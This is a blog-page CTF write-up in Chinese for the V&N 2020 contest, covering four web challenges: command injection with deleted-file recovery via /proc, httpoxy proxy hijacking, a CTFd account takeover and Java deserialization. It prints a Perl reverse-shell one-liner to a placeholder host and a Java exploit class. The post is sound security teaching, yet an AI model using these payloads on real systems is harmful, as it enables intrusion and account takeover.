<!DOCTYPE html>
<html class="has-navbar-fixed-top">
<head>
    <meta charset="utf-8">
<title>V&amp;N公开赛2020 writeup - cjM00N&#39;s blog</title>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.css">












<link rel="icon" href="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200225213644.png">


<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato">
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/bulma/0.8.0/css/bulma.min.css">



<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/styles/atom-one-light.min.css">


<link rel="stylesheet" href="/css/style.css">


<script defer src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/js/all.min.js" integrity="sha256-MAgcygDRahs+F/Nk5Vz387whB4kSK9NXlDN3w58LLq0=" crossorigin="anonymous"></script>


    
    
    
    
    
    
    
    
    
    

    


<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/rss.xml" title="cjM00N's blog" type="application/atom+xml">
</head>
<body>
    
<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
    <div class="container">
        <div class="navbar-brand">
            <a class="navbar-item navbar-logo" href="/">
                
                    
                    <img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200225213644.png" alt="" height="28">
                    
                
            </a>
            <div class="navbar-burger">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
        
        <div class="navbar-menu navbar-start">
            
            <a class="navbar-item "
               href="/archives">Archives</a>
            
            <a class="navbar-item "
               href="/categories">Categories</a>
            
            <a class="navbar-item "
               href="/tags">Tags</a>
            
            <a class="navbar-item "
               href="/friends">Friends</a>
            
            <a class="navbar-item "
               href="/about">About</a>
            
        </div>
        
        <div class="navbar-menu navbar-end">
            
            <a class="navbar-item search" title="搜索" href="javascript:;">
                <i class="fas fa-search"></i>
            </a>
            
            
            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
                <a class="navbar-item" title="目录">
                    <i class="fa fa-list"></i>
                </a>
                <div class="navbar-dropdown is-right">
                    
                    
                    
                    
                    <a class="navbar-item" href="#checkin">1&nbsp;&nbsp;<b>checkin</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#TimeTravel">2&nbsp;&nbsp;<b>TimeTravel</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#HappyCTFd">3&nbsp;&nbsp;<b>HappyCTFd</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#EasySpringMVC">4&nbsp;&nbsp;<b>EasySpringMVC</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#解题">4.1&nbsp;&nbsp;解题</a>
                    
                </div>
            </div>
            
            
            <a class="navbar-item" title="GitHub" href="https://github.com/cjm00n/" target="_blank" rel="noopener">
                
                <i class="fab fa-github"></i>
                
            </a>
               
            <a class="navbar-item" title="RSS" href="/rss.xml">
                
                <i class="fas fa-rss"></i>
                
            </a>
               
            
        </div>
    </div>
</nav>

    <section class="section">
    <div class="container">
    <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
        V&amp;N公开赛2020 writeup
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <i class="far fa-clock"></i>&nbsp;
            
            
            <time datetime="2020-03-03T15:09:06.238Z"
                itemprop="datePublished">3月 3 2020</time>更新&nbsp;
            

            
        </span>
        
        <span class="column is-narrow article-category">
            <i class="far fa-folder"></i>
            <a class="article-category-link" href="/categories/CTF/">CTF</a>
        </span>
        
        
        <span class="column is-narrow article-category">
            <i class="fab fa-hotjar" style="color: #E74C3C;"></i>&nbsp;&nbsp;热度: <span class="leancloud-counter" data-leancloud-counter-url="/2020/02/29/V-N公开赛2020-writeup/" data-leancloud-counter-inc></span><script>
var LeanCounter=function(){"use strict";function t(t){void 0===t&&(t={});var e=t.appId,n=t.appKey,r=t.elementClass;void 0===r&&(r=".leancloud-counter");var i=t.addCountInterval;void 0===i&&(i=100);var a=t.base;void 0===a&&(a="/1.1/classes/Counter");var o=t.initOnLoaded;if(void 0===o&&(o=!0),!e||!n)throw new Error("Missing appId or appKey.");this._appId=e,this._appKey=n,this._idCache={},this._addCountUrlQueue=[],this.addCountInterval=i,this.base=a,this.elements=document.querySelectorAll(r),o&&("loading"!==document.readyState?this.init():document.addEventListener("DOMContentLoaded",this.init.bind(this)))}return t.prototype._request=function(t,e,n){if(!this.apiServer)return Promise.reject(new Error("This LeanCounter instance is not initialized."));if("get"===t){var r="https://"+this.apiServer+this.base+e;if(n){var i=[];Object.keys(n).forEach(function(t){i.push(t+"="+encodeURI(n[t]))}),r+="?"+i.join("&")}return fetch(r,{headers:{"Content-Type":"application/json","X-LC-Id":this._appId,"X-LC-Key":this._appKey}}).then(function(t){return t.json()})}return fetch("https://"+this.apiServer+this.base+e,{method:t,headers:{"Content-Type":"application/json","X-LC-Id":this._appId,"X-LC-Key":this._appKey},body:JSON.stringify(n)}).then(function(t){return t.json()})},t.prototype.getCount=function(t){var e,n,r=this,i=t;return Array.isArray(i)||(i=Array(i)),e=[],n={},i.forEach(function(t){n[t]||(e.push(t),n[t]=!0)}),i=e,this._request("get","",{where:JSON.stringify({url:{$in:i}})}).then(function(t){var e=t.results,n={};return e.forEach(function(t){var e=t.url,i=t.objectId,a=t.time;r._idCache[e]||(r._idCache[e]=i),n[e]=a}),n})},t.prototype.addCount=function(t){var e=this;this._addCountUrlQueue.push(t),this._addCountIntervalId||(this._addCountIntervalId=setInterval(function(){if(0!==e._addCountUrlQueue.length){var t=e._addCountUrlQueue.pop();e._idCache[t]||e.getCount(t),e._request("put","/"+e._idCache[t],{time:{__op:"Increment",amount:1}})}},this.addCountInterval))},t.prototype.init=function(){var t=this;fetch("https://app-router.leancloud.cn/2/route?appId="+this._appId).then(function(t){return t.json()}).then(function(e){var n=e.api_server;t.apiServer=n;var r=[];return t.elements.forEach(function(t){r.push(t.dataset.leancloudCounterUrl)}),t.getCount(r)}).then(function(e){t.elements.forEach(function(n){"leancloudCounterInc"in n.dataset?(n.textContent=String(e[n.dataset.leancloudCounterUrl]+1),t.addCount(n.dataset.leancloudCounterUrl)):n.textContent=String(e[n.dataset.leancloudCounterUrl])})})},t}();

var leanCounter = new LeanCounter({
  appId: 'KnWlaUsawT6Pf6rwNLVJpt08-gzGzoHsz',
  appKey: 'HbSKKwFRuQ2jzyC1caWF8X5Y',
});
</script> ℃
        </span>
        
        
    </div>
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
        
        <html><head></head><body><blockquote class="colorquote info"><p>给赵师傅递茶, AK是不可能AK的</p>
</blockquote>

<a id="more"></a>

<h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>首先是签到题, 先看一下代码</p>
<p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request</span><br><span class="line"><span class="hljs-keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">flag_file = open(<span class="hljs-string">"flag.txt"</span>, <span class="hljs-string">"r"</span>)</span><br><span class="line"><span class="hljs-comment"># flag = flag_file.read()</span></span><br><span class="line"><span class="hljs-comment"># flag_file.close()</span></span><br><span class="line"><span class="hljs-comment">#</span></span><br><span class="line"><span class="hljs-comment"># @app.route('/flag')</span></span><br><span class="line"><span class="hljs-comment"># def flag():</span></span><br><span class="line"><span class="hljs-comment">#     return flag</span></span><br><span class="line"><span class="hljs-comment">## want flag? naive!</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># You will never find the thing you want:) I think</span></span><br><span class="line"><span class="hljs-meta">@app.route('/shell')</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">shell</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    os.system(<span class="hljs-string">"rm -f flag.txt"</span>)</span><br><span class="line">    exec_cmd = request.args.get(<span class="hljs-string">'c'</span>)</span><br><span class="line">    os.system(exec_cmd)</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-string">"1"</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">@app.route('/')</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">source</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    <span class="hljs-keyword">return</span> open(<span class="hljs-string">"app.py"</span>,<span class="hljs-string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="hljs-string">'0.0.0.0'</span>)</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>首先可以明确, 在我们执行命令的时候这个<code>flag.txt</code>已经被删了, 不存在什么条件竞争的</p>
<p>而我们观察一下程序的步骤</p>
<p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag_file = open(<span class="hljs-string">"flag.txt"</span>, <span class="hljs-string">"r"</span>)</span><br><span class="line">....</span><br><span class="line">os.system(<span class="hljs-string">"rm -f flag.txt"</span>)</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>第一步先打开了文件, 然后再对文件删除, 看到这个就想起了一个远古的知识点, 我也不记得是学什么看到的了</p>
<p><a href="https://blog.csdn.net/wyzxg/article/details/12654639" target="_blank" rel="noopener">https://blog.csdn.net/wyzxg/article/details/12654639</a></p>
<p>当程序打开一个文件, 会获得程序的文件描述符, 而此时如果文件被删除, 只会删除文件的目录项, 不会清空文件的内容, 原来的进程依然可以通过描述符对文件进行读取, 也就是说, 文件还存在内存里, 而具体的位置在</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/<pid>/fd/</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>下面用本地的例子举例</p>
<p>首先创建<code>flag.txt</code></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200229164418.png" alt></p>
<p>然后运行</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python app.py</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>之后我们访问<code>shell</code>, 就可以看到文件已经被删除了</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200229164538.png" alt></p>
<p>如何找到文件在内存中的位置呢, 利用<code>lsof</code></p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof|grep flag.txt</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200229164636.png" alt></p>
<p>其中第二列的<code>3512</code>就是<code><pid></code></p>
<p>在程序中打开</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /proc/3512/fd</span><br><span class="line">ls -al</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200229164739.png" alt></p>
<p>可以看到3就是我们需要的文件, 直接<code>cat</code>即可</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200229164831.png" alt></p>
<p>不过这里有两个问题, 首先是如何反弹shell</p>
<p>在做题的时候发现 (使用内网的<code>linux labs</code>), 在环境中执行</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://ip:port</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>却不能监听到访问, 一度怀疑不在内网, 还重开了两次</p>
<p>(错失一血hhh</p>
<p>这里歪个楼, 在出题人的环境配置不对的情况下, 我们可以通过</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls|base64>>app.py</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>的方式来写入app.py, 从而不用反弹shell也可以看到回显, 当然赵师傅没留下这个机会(x</p>
<p>上网搜了很多个反弹shell的payload</p>
<p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
<p><a href="https://zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html" target="_blank" rel="noopener">https://zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html</a></p>
<p>最后找到一个能用的</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"ip:port");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>然后成功返回shell, 但是发现第二个问题, 上面没有<code>lsof</code>, <code>ps</code>也没有反应</p>
<p>进去</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /proc/</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>看了一下, 发现只有几个, 就直接遍历一下hhhh</p>
<p>很快就能看到了</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200229011500.png" alt></p>
<h2 id="TimeTravel"><a href="#TimeTravel" class="headerlink" title="TimeTravel"></a>TimeTravel</h2><p>代码很简洁, 很赵师傅</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta"><?php</span></span><br><span class="line">error_reporting(<span class="hljs-number">0</span>);</span><br><span class="line"><span class="hljs-keyword">require</span> <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">'/vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">use</span> <span class="hljs-title">GuzzleHttp</span>\<span class="hljs-title">Client</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="hljs-keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'flag'</span>])) {</span><br><span class="line">    $client = <span class="hljs-keyword">new</span> Client();</span><br><span class="line">    $response = $client->get(<span class="hljs-string">'http://127.0.0.1:5000/api/eligible'</span>);</span><br><span class="line">    $content = $response->getBody();</span><br><span class="line">    $data = json_decode($content, <span class="hljs-keyword">TRUE</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span>($data[<span class="hljs-string">'success'</span>] === <span class="hljs-keyword">true</span>) {</span><br><span class="line">      <span class="hljs-keyword">echo</span> system(<span class="hljs-string">'/readflag'</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'file'</span>])) {</span><br><span class="line">    highlight_file($_GET[<span class="hljs-string">'file'</span>]);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'phpinfo'</span>])) {</span><br><span class="line">    phpinfo();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>我们先看熟悉的部分, 下面可以看到有读文件和<code>phpinfo</code>的地方, 我们就先看<code>phpinfo</code></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200229170113.png" alt></p>
<p>没有什么有意思的地方( 大概</p>
<p>然后我们就读文件吧, 这种程序的结构和tp很像, 我们首先读一下</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer.json</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200229170303.png" alt></p>
<p>可以明确的是, 程序代码这么少, 肯定是组件洞, 总不能一个<code>highlight_file</code>就能RCE是吧hhhh</p>
<p>但是不急, 继续读一读, 我很好奇中间的这个</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/api/eligible</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>是什么, 这个怎么读呢, 我们知道docker一般会有个<code>start.sh</code>, 经常会在根目录或者<code>/tmp</code>或者<code>~</code>, 试一下就会发现在根目录</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200229170504.png" alt></p>
<p>然后就能看到程序的路径, 读一下</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/srv/app.py</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200229170538.png" alt></p>
<p>这里题目已经很明确了, 只要等到2050年就可以拿到flag, 因此这里我就等了</p>
<p>(xxx</p>
<p>读完了源码我们去看看原来的那个组件的版本, 有没有什么漏洞</p>
<p>搜一下很快就会发现下面这些东西</p>
<p><a href="https://httpoxy.org/" target="_blank" rel="noopener">https://httpoxy.org/</a></p>
<p><a href="https://www.laruence.com/2016/07/19/3101.html" target="_blank" rel="noopener">https://www.laruence.com/2016/07/19/3101.html</a></p>
<p>就是说这个程序会将请求头中的</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PROXY:ip:port</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>注册为全局变量, 类似于</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http_proxy=ip:port command</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>所以我们只需要劫持一下返回即可</p>
<p>在<code>Linux labs</code>里面, 先建一个<code>index.php</code></p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta"><?php</span></span><br><span class="line">        $arr = <span class="hljs-keyword">array</span>(<span class="hljs-string">"success"</span>=><span class="hljs-keyword">true</span>);</span><br><span class="line">        header(<span class="hljs-string">"Content-Type:application/json"</span>);</span><br><span class="line">        <span class="hljs-keyword">echo</span> json_encode($arr);</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>然后运行</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -S 0:2333</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>有师傅后面问到, 这里提一下,  代理并不需要和原来的端口以及路径一致, 只需要给一个合适的返回就可以了, 而这个命令是启动php内置的一个web服务器, 如果文件名为<code>index.php</code></p>
<p>我们可以通过</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:port/</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>来访问, 如果是其他的命名则需要</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:port/filename.php</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>这样来访问, 因此这里必须要设置为<code>index.php</code></p>
<p>后面加上请求头访问即可</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200229015306.png" alt></p>
<h2 id="HappyCTFd"><a href="#HappyCTFd" class="headerlink" title="HappyCTFd"></a>HappyCTFd</h2><p>看到就猜是CTFd的漏洞了, 毕竟前段时间刚爆了一个</p>
<p><a href="https://www.colabug.com/2020/0204/6940556/" target="_blank" rel="noopener">https://www.colabug.com/2020/0204/6940556/</a></p>
<p>大概就是说, 在忘记密码验证的时候, 会对用户名进行</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strip()</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>的操作, 那么我们只需要注册一个</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>的账号, 然后忘记密码即可接管管理员的账号(需要使用内网邮件系统)</p>
<p>这个就不演示了, 登录后可以进去管理界面, 搭过CTFd的应该都知道, 他里面有一个</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Backup</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>的功能, 会把所有的记录备份下来, 我们直接用它下载全部内容</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200229021319.png" alt></p>
<p>就可以看到flag了</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200229021203.png" alt></p>
<h2 id="EasySpringMVC"><a href="#EasySpringMVC" class="headerlink" title="EasySpringMVC"></a>EasySpringMVC</h2><p>是个java题, 人生第一个正经java题, 然而没做出来—</p>
<p>先看一下代码, 我们可以使用<code>jd-gui</code>打开这个war包</p>
<p>看一眼<code>web.xml</code></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200229171329.png" alt></p>
<p>看不出啥有用的, 就去翻代码, 为了好看一点我复制出来在vscode看了</p>
<p>在</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WEB-INF\classes\com\filters\ClientInfoFilter.java</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>可以看到有这段, 明显是一个反序列化构造, 可以伪造cookie变成管理员</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200229171620.png" alt></p>
<p>编写exp如下</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> java.io.*;</span><br><span class="line"><span class="hljs-keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="hljs-keyword">import</span> com.tools.*;</span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>{</span><br><span class="line">        Base64.Encoder encoder = Base64.getEncoder();</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">try</span> {</span><br><span class="line">            ClientInfo cinfo = <span class="hljs-keyword">new</span> ClientInfo(<span class="hljs-string">"admin"</span>, <span class="hljs-string">"webmanager"</span>, <span class="hljs-string">"CC79398F535DB34F13B667D3C079BF00"</span>);</span><br><span class="line">            <span class="hljs-keyword">byte</span>[] bytes = Tools.create(cinfo);</span><br><span class="line">            String payload = encoder.encodeToString(bytes);</span><br><span class="line">            System.out.println(payload);</span><br><span class="line"></span><br><span class="line">        } <span class="hljs-keyword">catch</span> (Exception e) {</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Tools</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = <span class="hljs-number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">parse</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(bytes));</span><br><span class="line">        <span class="hljs-keyword">return</span> ois.readObject();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">private</span> String testCall;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] create(Object obj) <span class="hljs-keyword">throws</span> Exception {</span><br><span class="line">        ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        outputStream.writeObject(obj);</span><br><span class="line">        <span class="hljs-keyword">return</span> bos.toByteArray();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>{</span><br><span class="line">        Object obj = in.readObject();</span><br><span class="line">        (<span class="hljs-keyword">new</span> ProcessBuilder((String[]) obj)).start();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>还需要把<code>ClientInfo</code>类放在</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com/tools/ClientInfo.java</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>把构造类的第三个参数设置为你的SESSIONID即可</p>
<p>运行后将输出的base64填到cookie就可以了</p>
<p>然后我们就能获得文件上传的机会, 但是问题就在这里, 我经过很多次尝试</p>
<p>发现只能上传在</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>目录下</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200229173900.png" alt></p>
<p>其他的目录就会<code>permission denied</code></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200229173833.png" alt></p>
<p>而我们的调用是这样的</p>
